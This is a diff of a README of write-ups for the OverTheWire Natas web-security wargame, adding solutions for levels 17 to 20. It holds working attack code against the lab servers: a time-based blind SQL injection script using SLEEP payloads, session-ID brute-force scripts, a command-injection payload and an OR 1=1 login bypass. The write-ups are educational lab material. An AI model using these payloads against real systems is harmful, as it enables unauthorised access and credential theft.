@@ -1,6 +1,7 @@
 
 
 
+
 # OverTheWire Natas Solutions
 
 ![Code](https://img.shields.io/badge/Code-Markdown-orange?logo=markdown) ![Coverage](https://img.shields.io/badge/Coverage-50%25-yellow) ![Status](https://img.shields.io/badge/Status-In_production-green)
@@ -31,6 +32,10 @@ Please use these as hints to solve the challenges yourself. Do not use them to c
 - [Level 14](#level14) 
 - [Level 15](#level15)
 - [Level 16](#level16)
+- [Level 17](#level17)
+- [Level 18](#level18)
+- [Level 19](#level19)
+- [Level 20](#level20)
 - [Final Notes](#finalnotes)
 
 ## Level 0 <a name="level0"></a>
@@ -158,7 +163,7 @@ Landing on the site, we see this:
 The site tells us it accepts only requests from a specific URL/webpage. To understand better what we are working with, let's do some theory:
 > The web works by using protocols, in this case the [HTTP protocol](https://en.wikipedia.org/wiki/HTTP) (HyperText Transfer Protocol), which allows request-response communication between server and client. The request includes the request method, the requested URL and the protocol version. However, it can also include additional, potentially needed information, the _request headers_.
 
-In this case, the header we're looking for is the [referer header](https://en.wikipedia.org/wiki/HTTP_referer), which specifies where the request is coming from, and that's exactly what we need. <br>
+In this case, the header we're looking for is the [referer header](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Referer), which specifies where the request is coming from, and that's exactly what we need. <br>
 Opening the Developer Tools[^1], we can access the Network tab, where if we reload, we can see the traffic generated after:
 
 ![Network](/imgs/lvl4/network.png)
@@ -382,7 +387,7 @@ if($key != "") {
 }
 ?>
 ```
-Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an [XSS](https://cwe.mitre.org/data/definitions/79.html) attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
+Looking closer, we see the key is not sanitized in any way, thus we can exploit this weakness and use it to our advantage in an [XSS](https://capec.mitre.org/data/definitions/63.html) attack to gain information about the password. The biggest problem, though, is the [`grep`](https://en.wikipedia.org/wiki/Grep) command, which we need to escape from. <br>
 Looking at the [`man`](https://en.wikipedia.org/wiki/Man_page) pages for it, we see that running it with the `--help` flag will print out, and then exit. Let's try it: we'll create a payload like this one, and see what happens to the output... <br>
 Payload: `--help && pwd # `&emsp;← Beware of the final space, it's necessary or it won't work
 
@@ -793,7 +798,7 @@ Password: <input name="password"><br>
 <?php } ?>
 ```
 Seems like we're working with [MySQL](https://www.mysql.com/), an open source database for storing information in tables. It would be easy for us to see the information stored, but we can't since it's hosted on the server-side. Or can we? <br>
-Working with SQL, it's impossible not to think about [SQL Injection](https://cwe.mitre.org/data/definitions/89.html), a common attack done to extract username, passwords and log in without brute force. Here, we see in the source code the `username` is not sanitized, and thus we can send a payload to log us in no matter what. The easiest one will work perfectly for this case: `" OR 1 = 1 # `. Simply, it'll always return true, and we can bypass the check `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` (it becomes `if(true > 0)` which is true):
+Working with SQL, it's impossible not to think about [SQL Injection](https://capec.mitre.org/data/definitions/66.html), a common attack done to extract username, passwords and log in without brute force. Here, we see in the source code the `username` is not sanitized, and thus we can send a payload to log us in no matter what. The easiest one will work perfectly for this case: `" OR 1 = 1 # `. Simply, it'll always return true, and we can bypass the check `if(mysqli_num_rows(mysqli_query($link, $query)) > 0)` (it becomes `if(true > 0)` which is true):
 ```html
 <html>
 	<head>
@@ -855,7 +860,7 @@ Username: <input name="username"><br>
 <?php } ?>``
 ```
 Whenever we send a username, the code checks for its existence in the table `users` (which structure is kindly provided to us). The hard part is guessing which user has the password we need, and how to get it. <br>
-This is an example of [Blind SQL Injection](https://portswigger.net/web-security/sql-injection/blind), where:
+This is an example of [Blind SQL Injection](https://capec.mitre.org/data/definitions/7.html), where:
 > Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.
 
 Simply testing which possible name we have for the next challenge is easy: `natas16` is a valid username. Now we need to extract information of the password. Based on the existence or not of an user, we can determine if it has a certain password or not by just asking if it exists. Let's use the input field to search for a possible password:
@@ -872,7 +877,6 @@ from requests.auth import HTTPBasicAuth
 
 # Basic htpp request variables
 login = HTTPBasicAuth("natas15", "****")	# Username and password
-headers = {"Content-Type": "application/x-www-form-urlencoded"}
 url = "http://natas15.natas.labs.overthewire.org/"
 
 # Password generator
@@ -887,7 +891,7 @@ while count <= max_lenght:
     for c in valid_characters:
         # Our payload
         payload = "natas16\" AND BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\" -- "
-        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
+        response = requests.post(url, data = {"username": payload}, auth = login, verify = False)
         # We got a hit
         if "This user exists." in response.text:
             print("Found: " + password + c)
@@ -1054,13 +1058,403 @@ Username: <input name="username"><br>
 </form>  
 <?php } ?>
 ```
+Now a problem arises: there is no output on whatever we do. The echo lines are commented out, thus no matter what we input, we get no visible response. Maybe we can't see it, but feel it... <br>
+Let's try something we know works: the username `natas18` (which must be present in the table, otherwise we can't move on). If we input that, as before, there's nothing shown. But let's try a secret tab in the Developer Tools[^1]: the timings. Here, we can see how long the page took to load certain things inside, from connecting, to the set up, and then the time it took to get a response:
 
+![Timings](/imgs/lvl17/timings.png) 
+
+In this case, the page waited ~70ms to get a response. Knowing that, we can abuse the timings inside the web app to extract information about the password, just like we did before. This type of attack, called [Time Based Blind SQL Injection](https://beaglesecurity.com/blog/vulnerability/time-based-blind-sql-injection.html), is usually checked with the following payload: ``a" OR IF(1=1, SLEEP(5), 0) -- ``. Let's try it and see what happens:
+
+![Attack](/imgs/lvl17/attack.png)
+
+As you can see, we get a long delay, compatible with the `SLEEP(5)` we set up (~70ms + 5000ms = ~5s). Let's modify [Level 15](#level15)'s code to add a delay and retrieve the password: <br>
+[`time-blind-sql.py`](/scripts/lvl17/time-blind-sql.py)
+```python
+import string       # For password generation
+import requests     # For http requests
+from requests.auth import HTTPBasicAuth
+
+# Basic htpp request variables
+login = HTTPBasicAuth("natas17", "****") # Username and password
+headers = {"Content-Type": "application/x-www-form-urlencoded"}
+url = "http://natas17.natas.labs.overthewire.org/"
+
+# Password generator
+count = 1
+password = ""
+max_lenght = 32
+valid_characters = string.digits + string.ascii_letters
+
+# While we haven't found the password...
+while count <= max_lenght:
+    # ... for each valid character (numbers, lowercase and uppercase)
+    for c in valid_characters:
+        # Our payload
+        payload = "natas18\" AND IF(BINARY substring(password, 1, " + str(count) + ") = \"" + password + c + "\", SLEEP(2), False) -- "
+        response = requests.post(url, data = {"username": payload}, headers = headers, auth = login, verify = False)
+        # We got a hit
+        if response.elapsed.total_seconds() > 2:
+            print("Found: " + password + c)
+            password += c
+            count += 1
+
+print("Final password: " + password)
+```
+And we'll get the password for the next level.
+
+## Level 18 <a name="level18"></a>
+Landing on the site, we see this:
+
+![Level 18](/imgs/lvl18/screenshot.png)
+
+A login page with username and password. Like the other previous levels, there's something we must exploit to gain access. Let's look at the source code:
+```php
+`<?php  
+  
+$maxid = 640; // 640 should be enough for everyone  
+  
+function isValidAdminLogin() { /* {{{ */  
+	if($_REQUEST["username"] == "admin") {  
+		/* This method of authentication appears to be unsafe and has been disabled for now. */  
+		//return 1;  
+	}  
+  
+	return 0;  
+}  
+/* }}} */  
+function isValidID($id) { /* {{{ */  
+	return is_numeric($id);  
+}  
+/* }}} */  
+function createID($user) { /* {{{ */  
+	global $maxid;  
+	return rand(1, $maxid);  
+}  
+/* }}} */  
+function debug($msg) { /* {{{ */  
+	if(array_key_exists("debug", $_GET)) {  
+		print "DEBUG: $msg<br>";  
+	}  
+}  
+/* }}} */  
+function my_session_start() { /* {{{ */  
+	if(array_key_exists("PHPSESSID", $_COOKIE) and isValidID($_COOKIE["PHPSESSID"])) {  
+		if(!session_start()) {  
+			debug("Session start failed");  
+			return false;  
+		} else {  
+			debug("Session start ok");  
+			if(!array_key_exists("admin", $_SESSION)) {  
+				debug("Session was old: admin flag set");  
+				$_SESSION["admin"] = 0; // backwards compatible, secure  
+			}  
+			return true;  
+		}  
+	}  
+  
+	return false;  
+}  
+/* }}} */  
+function print_credentials() { /* {{{ */  
+	if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
+		print "You are an admin. The credentials for the next level are:<br>";  
+		print "<pre>Username: natas19\n";  
+		print "Password: <censored></pre>";  
+	} else {  
+		print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas19.";  
+	}  
+}  
+/* }}} */  
+  
+$showform = true;  
+if(my_session_start()) {  
+	print_credentials();  
+	$showform = false;  
+} else {  
+	if(array_key_exists("username", $_REQUEST) && array_key_exists("password", $_REQUEST)) {  
+		session_id(createID($_REQUEST["username"]));  
+		session_start();  
+		$_SESSION["admin"] = isValidAdminLogin();  
+		debug("New session started");  
+		$showform = false;  
+		print_credentials();  
+	}  
+}  
+  
+if($showform) {  
+?>  
+  
+<p>  
+Please login with your admin account to retrieve credentials for natas19.  
+</p>  
+  
+<form action="index.php" method="POST">  
+Username: <input name="username"><br>  
+Password: <input name="password"><br>  
+<input type="submit" value="Login" />  
+</form>  
+<?php } ?>`
+```
+We see every time we log in, we instantiate a new session with a specific `PHPSESSID`, which is then added to the site's cookies. Then we check if: `$_SESSION` is started + we're `admin` + `PHPSESSID == 1`, and that logs us in as admin and we can see the password for the next challenge. <br>
+There's something to notice though: by "fixing" the security issue in the code, the `isValidAdminLogin()` function always returns 0 if the username is `admin`, and if we try anything else, we fall into 
+```php
+if(!array_key_exists("admin", $_SESSION)) { debug("Session was old: admin flag set"); $_SESSION["admin"] = 0; // backwards compatible, secure }
+```
+ and get automatically set as `admin` with a value of 0. Thus we're seen as `admin` no matter what we do. We can see that by appending `&debug` to our URL:
+
+![Debug](/imgs/lvl18/debug.png)
+
+ Now we satisfy two of the conditions necessary for the authentication, where the other one is having a `PHPSESSID == 1`. If we try changing the cookies, we get nowhere:
+ 
+![Cookie](/imgs/lvl18/cookie.png)
+
+Strange. But if we dig deeper, we see there's no function that sets `$_SESSION["admin"]` to any value. This means something is hidden to us, and it's not as simple as changing the cookie of a session to get in. <br>
+Now, something is kinda odd about the code: we have a fixed amount of session ID we can have from `$maxid = 640; // 640 should be enough for everyone`, and if they're enough for everyone, that includes the admin. Thus, we can brute force our way in by trying each ID one-by-one and see if we can get in without even knowing the server-side function to set IDs, in an attack known as [Session Hijacking](https://capec.mitre.org/data/definitions/593.html). Let's modify [Level 15](#level15)'s script to work in our case: <br>
+[`session-hijacking.py`](/scripts/lvl18/session-hijacking.py)
+```python
+import string       # For password generation
+import requests     # For http requests
+from requests.auth import HTTPBasicAuth
+
+# Basic htpp request variables
+login = HTTPBasicAuth("natas18", "****") # Username and password
+url = "http://natas18.natas.labs.overthewire.org/"
+
+# Possible IDs
+count = 1
+max_ids = 640
+
+# While we haven't found the ID...
+while count <= max_ids:
+    # Our custom cookie
+    session = "PHPSESSID=" + str(count)
+    cookie = {"Cookie": session}
+    response = requests.post(url, headers = cookie, auth = login, verify = False)
+    # We got a hit
+    if "You are an admin" in response.text:
+        print("Found: " + str(count))
+        break
+
+    count += 1
+```
+And we get the solution:
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+		<h1>natas18</h1>
+		<div id="content">
+			You are an admin. The credentials for the next level are:<br>
+			<pre>Username: natas19
+			Password: ****</pre>
+			<div id="viewsource">
+			<a href="index-source.html">View sourcecode</a></div>
+		</div>
+	</body>
+</html>
+```
+
+## Level 19 <a name="level19"></a>
+Landing on the site, we see this:
+
+![Level 19](/imgs/lvl19/screenshot.png)
+
+Same as before, but now IDs are not sequential, and no source code? That sounds like a real headache... Let's see what we're working with, by trying a random username like `aa`:
+
+![Cookie](/imgs/lvl19/cookie.png)
+
+We now have an encoded cookie `PHPSESSID=3338332d6161`. Now, it might not be obvious at first glance, but if we read it again, we see there are two numbers repeated: `6161`, and our username was `aa`. This is a good indication that the username is encoded into the cookie, but we can confirm it by noticing the numbers are [ASCII](https://en.wikipedia.org/wiki/ASCII) representation of characters in hexadecimal format. In fact, if we use an ASCII table and [decode](https://gchq.github.io/CyberChef/#recipe=From_Charcode('Space',16)&input=MzMgMzggMzMgMmQgNjEgNjE) it, we get `PHPSESSID=383-aa`. <br>
+We now know how it is encoded, and we can assume it needs the username `admin` (which is `61646d696e`), but there are three random numbers before it, thus maxing out at 999 possibile sessions under admin. We can brute force our way in modifying a bit the script from [Level 18](#level18):
+[`encoded-session-hijacking.py`](/scripts/lvl19/encoded-session-hijacking.py)
+```python
+import string       # For password generation
+import requests     # For http requests
+from requests.auth import HTTPBasicAuth
+
+# Basic htpp request variables
+login = HTTPBasicAuth("natas19", "****") # Username and password
+url = "http://natas19.natas.labs.overthewire.org/"
+
+# Possible IDs
+count = 1
+max_ids = 999
+c = ""
+
+# While we haven't found the ID...
+while count <= max_ids:
+    # Create hexadecimal representation of ASCII character
+    code = format(count, "03d")        # Represent numbers in xxx format
+    code = list(bytes(code, 'ascii')) # Translate to ASCII
+    for v in code:
+        c += str(hex(v)[2:])        # Translate to hex
+
+    # Our custom cookie
+    session = "PHPSESSID=" + c + "2d61646d696e" # PHPSESSID={number}-admin
+    cookie = {"Cookie": session}
+    response = requests.post(url, headers = cookie, auth = login, verify = False)
+    # We got a hit
+    if "You are an admin" in response.text:
+        print("Found: " + session)
+        break
+    c = ""
+    count += 1
+```
+And we get our successful cookie as `PHPSESSID=3238312d61646d696e`, or `281-admin`. Modifying the cookie through the Developer Tools[^1], we get the password:
+```html
+<html>
+	<head>
+		...
+	</head>
+	<body>
+		<h1>natas19</h1>
+		<div id="content">
+			<p>
+				<b>
+					This page uses mostly the same code as the previous level, but session IDs are no longer sequential...
+				</b>
+			</p>
+			You are an admin. The credentials for the next level are:<br>
+			<pre>Username: natas20
+			Password: ****</pre>
+		</div>
+	</body>
+</html>
+```
+
+## Level 20 <a name="level20"></a>
+Landing on the site, we see this:
+
+![Level 20](/imgs/lvl20/screenshot.png)
+
+Seems like we're already logged in as a random guest, and we need to become admin. Let's look at the source code:
+```php
+<?php  
+  
+function debug($msg) { /* {{{ */  
+	if(array_key_exists("debug", $_GET)) {  
+		print "DEBUG: $msg<br>";  
+	}  
+}  
+/* }}} */  
+function print_credentials() { /* {{{ */  
+	if($_SESSION and array_key_exists("admin", $_SESSION) and $_SESSION["admin"] == 1) {  
+		print "You are an admin. The credentials for the next level are:<br>";  
+		print "<pre>Username: natas21\n";  
+		print "Password: <censored></pre>";  
+	} else {  
+		print "You are logged in as a regular user. Login as an admin to retrieve credentials for natas21.";  
+	}  
+}  
+/* }}} */  
+  
+/* we don't need this */  
+function myopen($path, $name) {  
+	//debug("MYOPEN $path $name");  
+	return true;  
+}  
+  
+/* we don't need this */  
+function myclose() {  
+	//debug("MYCLOSE");  
+	return true;  
+}  
+  
+function myread($sid) {  
+	debug("MYREAD $sid");  
+	if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {  
+		debug("Invalid SID");  
+		return "";  
+	}  
+	$filename = session_save_path() . "/" . "mysess_" . $sid;  
+	if(!file_exists($filename)) {  
+		debug("Session file doesn't exist");  
+		return "";  
+	}  
+	debug("Reading from ". $filename);  
+	$data = file_get_contents($filename);  
+	$_SESSION = array();  
+	foreach(explode("\n", $data) as $line) {  
+		debug("Read [$line]");  
+		$parts = explode(" ", $line, 2);  
+		if($parts[0] != "") $_SESSION[$parts[0]] = $parts[1];  
+		}  
+	return session_encode() ?: "";  
+}  
+  
+function mywrite($sid, $data) {  
+	// $data contains the serialized version of $_SESSION  
+	// but our encoding is better  
+	debug("MYWRITE $sid  $data");  
+	// make sure the sid is alnum only!!  
+	if(strspn($sid, "1234567890qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM-") != strlen($sid)) {  
+		debug("Invalid SID");  
+		return;  
+	}  
+	$filename = session_save_path() . "/" . "mysess_" . $sid;  
+	$data = "";  
+	debug("Saving in ". $filename);  
+	ksort($_SESSION);  
+	foreach($_SESSION as $key => $value) {  
+		debug("$key => $value");  
+		$data .= "$key  $value\n";  
+	}  
+	file_put_contents($filename, $data);  
+	chmod($filename, 0600);  
+	return true;  
+}  
+  
+/* we don't need this */  
+function mydestroy($sid) {  
+	//debug("MYDESTROY $sid");  
+	return true;  
+}  
+/* we don't need this */  
+function mygarbage($t) {  
+	//debug("MYGARBAGE $t");  
+	return true;  
+}  
+  
+session_set_save_handler(  
+	"myopen",  
+	"myclose",  
+	"myread",  
+	"mywrite",  
+	"mydestroy",  
+	"mygarbage");  
+session_start();  
+  
+if(array_key_exists("name", $_REQUEST)) {  
+	$_SESSION["name"] = $_REQUEST["name"];  
+	debug("Name set to " . $_REQUEST["name"]);  
+}  
+  
+print_credentials();  
+  
+$name = "";  
+if(array_key_exists("name", $_SESSION)) {  
+	$name = $_SESSION["name"];  
+}  
+  
+?>  
+  
+<form action="index.php" method="POST">  
+Your name: <input name="name" value="<?=$name?>">`
+```
+That's a lot of code. Let's see what it actually does: we're enabling debug by adding `?debug` to our URL and see what it prints out:
+
+![Debug](/imgs/lvl20/debug.png)
+
+Seems like our name is being written to a file inside `/var/lib/php/sessions/mysess_{encoded string}` by the function `mywrite()` in the source. Looks like have some kind of file management going on (as indicated from the functions `myopen()` \<empty>, `myclose()` \<empty>, `myread()`, `mywrite()`, `mydestroy()` \<empty>, and `mygarbage()` \<empty>). <br>
+Reading the code carefully, a few things pop up as strange: for example, in the `mywrite()` function we write `$data` which contains `$key $value\n`, but we only input the `$name`, and then in `myread()` it runs through every line of the file `foreach(explode("\n", $data) as $line)`. Now this looks like a vulnerability. If we can inject both the `$key` and `$value` inside the file, we can then read it and use it to gain access to the password. Something like: `"test\nadmin 1"` $\Rightarrow$ `"test {random value}\nadmin 1"` $\Rightarrow$ read as `test {random value}` and `admin 1`. Since it authenticates only the last line, we become admin. <br>
+ 
 ## Final Notes <a name="finalnotes"></a>
 This project is under the [GPL-3.0 License](https://www.gnu.org/licenses/gpl-3.0.html). Any use or distribution is completely free, unless edited. <br>
 [OverTheWire Natas](https://overthewire.org/wargames/natas/), its challenges and solutions are all under their domain. I claim nothing. If you liked the challenges, please consider [donating](https://overthewire.org/information/donate.html) to them. <br>
-Huge thanks to [CWE](https://cwe.mitre.org/index.html) for explanations and code examples. Check it out. <br>
+Huge thanks to [CAPEC](https://capec.mitre.org/index.html) and [CWE](https://cwe.mitre.org/) for explanations and code examples. <br>
 Main contributors:
-- Owner: [Unpwnabl](https://github.com/unpwnabl)
+\- [Unpwnabl](https://github.com/unpwnabl) (owner)
 
 ---
 
@@ -1069,6 +1463,7 @@ Main contributors:
 [^3]: \- `convert` is part of [ImageMagick](https://github.com/ImageMagick/ImageMagick), necessary to have a smaller image (9x9 is a arbitrary dimension I chose). <br>
 \- `>>` redirect stdout to file. <br>
 \- Thanks to [Synactivy](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there)  for the explanation and some commands.
+
 
 
 
